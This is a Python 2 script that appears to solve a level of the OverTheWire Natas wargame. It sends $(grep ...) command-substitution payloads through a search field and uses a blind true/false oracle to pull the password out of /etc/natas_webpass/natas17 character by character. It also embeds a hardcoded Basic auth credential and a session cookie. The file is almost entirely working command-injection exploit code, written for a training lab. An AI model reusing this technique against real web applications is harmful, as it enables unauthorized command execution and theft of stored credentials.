#!/usr/bin/python
import urllib
import urllib2
import string


def generate_request(needle, URL):
    url = URL
    url += urllib.urlencode({'submit':'Search', 'needle':needle})
    req = urllib2.Request(url)
    req.add_header('User-Agent', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0')
    req.add_header('Authorization',  'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==')
    req.add_header('Cookie' , '__cfduid=d343ee483747c1158b3dd095b778a57ff1549137174')
    return urllib2.urlopen(req)


def main():
    # if character found in /etc/natas_webpass/natas17 then, Found_Character+April = Nothing will found and if, Nothing Found then,
    # grep with filter April Successful. So, this negative filter will help us to extract password.

    POSSIBLE_KEYS = ''

    CMD = '$(grep {} /etc/natas_webpass/natas17)April'
    CMD1 = '$(egrep ^{} /etc/natas_webpass/natas17)April'

    # our main target URL
    URL = 'http://natas16.natas.labs.overthewire.org/?'

    for i in string.ascii_letters+string.digits:
        req = generate_request(CMD.format(i), URL)
        data =  req.read()
        if data.find('April')<1:
            POSSIBLE_KEYS += i
            print "[*] Possible Keyword : ", POSSIBLE_KEYS


    KEY = ''
    for _ in range(32):
        for i in POSSIBLE_KEYS:
            req = generate_request(CMD1.format(KEY+i), URL)
            data = req.read()
            if data.find('April')<1:
                KEY += i
                print "[*] KEY : ", KEY

    return  


if __name__=='__main__':
    main()
